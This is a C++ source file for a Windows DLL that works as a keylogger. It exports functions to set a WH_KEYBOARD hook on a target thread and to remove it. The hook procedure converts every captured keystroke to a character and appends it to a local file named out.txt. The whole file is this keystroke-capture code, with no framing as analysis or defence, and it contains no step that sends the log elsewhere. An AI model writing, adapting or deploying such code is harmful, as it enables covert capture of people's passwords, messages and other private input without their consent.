// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "Guard.h"

#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)

static std::unique_ptr<HHOOK> g_hKeyboardHook = NULL;
std::unique_ptr<HINSTANCE> g_hInstance = NULL;
const std::unique_ptr<Guard> g_outputFile = std::make_unique<Guard>(L"out.txt");

VOID WriteToFile(const char* string, const HANDLE& hFile)
{
    DWORD dwBytesWritten = 0;
    DWORD dwBytesToWrite = static_cast<DWORD>(sizeof(*string));

    BOOL bErrorFlag = FALSE;

    bErrorFlag = WriteFile(
        hFile,
        string,
        dwBytesToWrite,
        &dwBytesWritten,
        NULL);

    if (FALSE == bErrorFlag)
    {
        std::cout << "Terminal failure: Unable to write to file.\n";
    }
    else
    {
        if (dwBytesWritten != dwBytesToWrite)
        {
            std::cout << "Error: dwBytesWritten != dwBytesToWrite\n";
        }
    }
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    if (code >= 0 && code == HC_ACTION && ((lParam >> 30) & 1))
    {
        if (wParam == VK_ESCAPE)
        {
            PostQuitMessage(0);
        }
        
        if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f))
        {
            BYTE ks[256];
            char ch = '\n';
            WORD w = NULL;
            UINT scan = 0;
            HANDLE file = g_outputFile->GetHandle();

            if (GetKeyboardState(ks))
            {   
                ToAscii(static_cast<UINT>(wParam), scan, ks, &w, 0);
                if (w) {
                    ch = static_cast<char>(w);
                    if (file)
                    {
                        WriteToFile(&ch, file);
                    }
                }
            }
        }
    }
    return CallNextHookEx(*g_hKeyboardHook, code, wParam, lParam);
}

EXTERN_DLL_EXPORT BOOL CALLBACK SetKeyboardHook(const DWORD& thread)
{    
    if (!g_hKeyboardHook && *g_hInstance && (thread >= 0))
        g_hKeyboardHook = std::make_unique<HHOOK>(SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, *g_hInstance, thread));
    return *g_hKeyboardHook ? TRUE : FALSE;
}

EXTERN_DLL_EXPORT VOID CALLBACK UnhookKeyboardHook()
{
    if (g_hKeyboardHook) 
    {
        UnhookWindowsHookEx(*g_hKeyboardHook);
    }
    g_hKeyboardHook.release();
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        g_hInstance = std::make_unique<HINSTANCE>(hModule);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        if (lpReserved == NULL)
        {
            g_hKeyboardHook.reset(0);
        }

        g_hKeyboardHook.release();
        g_hInstance.release();
        break;
    }
    return TRUE;
}

